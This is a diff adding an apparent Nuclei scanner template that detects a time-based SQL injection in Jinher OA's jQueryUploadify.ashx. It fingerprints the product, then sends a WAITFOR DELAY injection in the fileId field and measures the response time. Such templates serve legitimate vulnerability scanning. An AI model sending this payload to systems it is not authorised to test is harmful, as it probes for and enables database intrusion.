@@ -1,0 +1,45 @@
+id: jinher-jqueryuploadify-aspx-sqli
+info:
+  name: Jinher OA jQueryUploadify.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.login/PassWordNew.aspx"
+      - "{{BaseURL}}/c6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+  
+  - method: POST
+    path:
+      - "{{BaseURL}}/C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "type=delete&fileId=-99';WAITFOR+DELAY'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
